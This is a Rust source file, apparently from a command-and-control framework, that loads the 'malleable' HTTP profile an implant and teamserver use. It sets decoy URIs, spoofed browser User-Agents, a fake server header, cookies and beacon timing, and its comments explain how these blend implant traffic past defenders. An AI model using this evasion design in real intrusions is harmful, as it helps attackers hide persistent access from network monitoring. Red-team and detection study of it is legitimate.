use rand_core::{OsRng, RngCore};
use serde::Deserialize;
pub const DEFAULT_PROFILE_PATH: &str = "profiles/default.yaml";

fn default_uris() -> Vec<String> {
    vec![
        "/api/v1/telemetry".to_string(),
        "/cdn/update".to_string(),
        "/static/config".to_string(),
    ]
}

fn default_user_agent() -> String {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36".to_string()
}

fn default_server_header() -> String {
    "nginx".to_string()
}

fn default_cookie_name() -> String {
    "sid".to_string()
}

fn default_headers() -> Vec<(String, String)> {
    Vec::new()
}

fn default_user_agents() -> Vec<String> {
    Vec::new()
}

/// Malleable transport profile shared by the teamserver listener and the
/// implant. Controls the outer HTTP envelope (URIs, User-Agent, Server
/// header, session-cookie name, arbitrary extra headers, optional UA
/// pool) served inside TLS, plus default beacon timing.
#[derive(Debug, Clone, Deserialize)]
pub struct Profile {
    #[serde(default = "default_uris")]
    pub uris: Vec<String>,
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    /// Optional User-Agent pool: when non-empty, the implant picks ONE
    /// entry at startup and stays on it for the whole session — a stable
    /// UA per session (browsers do not rotate mid-session), but a
    /// different UA per implant. `user_agent` is the fallback when the
    /// pool is empty (and keeps single-UA profiles working).
    #[serde(default = "default_user_agents")]
    pub user_agents: Vec<String>,
    /// Extra literal headers injected into every implant request (e.g.
    /// Accept-Language, sec-ch-ua hints) — richer blending than the UA
    /// alone. Values are emitted verbatim; no templating.
    #[serde(default = "default_headers")]
    pub headers: Vec<(String, String)>,
    #[serde(default = "default_server_header")]
    pub server_header: String,
    /// Cookie the session token rides in instead of the X-Session
    /// header: web-fronted traffic with a session cookie is the norm,
    /// a custom header is not (T035).
    #[serde(default = "default_cookie_name")]
    pub cookie_name: String,
    #[serde(default = "default_sleep_secs")]
    pub sleep_secs: u64,
    #[serde(default = "default_jitter")]
    pub jitter: f32,
}

impl Default for Profile {
    fn default() -> Self {
        Profile {
            uris: default_uris(),
            user_agent: default_user_agent(),
            user_agents: default_user_agents(),
            headers: default_headers(),
            server_header: default_server_header(),
            cookie_name: default_cookie_name(),
            sleep_secs: default_sleep_secs(),
            jitter: default_jitter(),
        }
    }
}

fn default_sleep_secs() -> u64 {
    5
}

fn default_jitter() -> f32 {
    0.25
}

impl Profile {
    pub fn load(text: &str) -> Result<Self, String> {
        let profile: Profile = serde_yaml::from_str(text).map_err(|e| e.to_string())?;
        if profile.uris.is_empty() {
            return Err("profile must define at least one uri".to_string());
        }
        if !(0.0..=1.0).contains(&profile.jitter) {
            return Err("jitter must be between 0.0 and 1.0".to_string());
        }
        Ok(profile)
    }

    pub fn load_file(path: &std::path::Path) -> Result<Self, String> {
        let text = std::fs::read_to_string(path).map_err(|e| format!("{}: {e}", path.display()))?;
        Profile::load(&text)
    }

    pub fn pick_uri(&self) -> &str {
        let idx = (OsRng.next_u32() as usize) % self.uris.len();
        &self.uris[idx]
    }

    /// The User-Agent this implant session uses: one stable pick from the
    /// pool when configured, the single `user_agent` otherwise. Chosen
    /// once per session on purpose — browsers keep their UA for the
    /// session's lifetime, and a per-request rotation is its own anomaly.
    pub fn pick_user_agent(&self) -> &str {
        if self.user_agents.is_empty() {
            &self.user_agent
        } else {
            let idx = (OsRng.next_u32() as usize) % self.user_agents.len();
            &self.user_agents[idx]
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn defaults_when_empty() {
        let profile = Profile::load("uris: [/x]").unwrap();
        assert_eq!(profile.uris, vec!["/x".to_string()]);
        assert_eq!(profile.sleep_secs, 5);
        assert_eq!(profile.jitter, 0.25);
        assert_eq!(profile.server_header, "nginx");
        assert!(profile.user_agent.starts_with("Mozilla/5.0"));
    }

    #[test]
    fn full_parse() {
        let text = "uris: [/a, /b]\nuser_agent: test-agent\nserver_header: iis\ncookie_name: session\nsleep_secs: 3\njitter: 0.5\n";
        let profile = Profile::load(text).unwrap();
        assert_eq!(profile.uris.len(), 2);
        assert_eq!(profile.user_agent, "test-agent");
        assert_eq!(profile.server_header, "iis");
        assert_eq!(profile.cookie_name, "session");
        assert_eq!(profile.sleep_secs, 3);
        assert_eq!(profile.jitter, 0.5);
        let picked = profile.pick_uri();
        assert!(picked == "/a" || picked == "/b");
    }

    #[test]
    fn rejects_empty_uris_and_bad_jitter() {
        assert!(Profile::load("uris: []").is_err());
        assert!(Profile::load("uris: [/a]\njitter: 1.5").is_err());
        assert!(Profile::load("uris: [/a]\njitter: -0.1").is_err());
    }

    #[test]
    fn user_agent_pool_and_extra_headers_parse() {
        let text = "uris: [/a]\nuser_agent: fallback-agent\nuser_agents: [ua-one, ua-two]\nheaders: [[Accept-Language, en-US], [X-Client, alpha]]\n";
        let profile = Profile::load(text).unwrap();
        assert_eq!(profile.user_agents.len(), 2);
        // The pick is the caller's one-shot decision (made once per
        // session); repeated calls may draw different entries.
        let picked = profile.pick_user_agent();
        assert!(picked == "ua-one" || picked == "ua-two");
        assert_eq!(
            profile.headers,
            vec![
                ("Accept-Language".to_string(), "en-US".to_string()),
                ("X-Client".to_string(), "alpha".to_string()),
            ]
        );
    }

    #[test]
    fn user_agent_falls_back_to_single_field() {
        let profile = Profile::load("uris: [/a]\nuser_agent: solo").unwrap();
        assert_eq!(profile.pick_user_agent(), "solo");
        assert!(profile.headers.is_empty());
    }
}
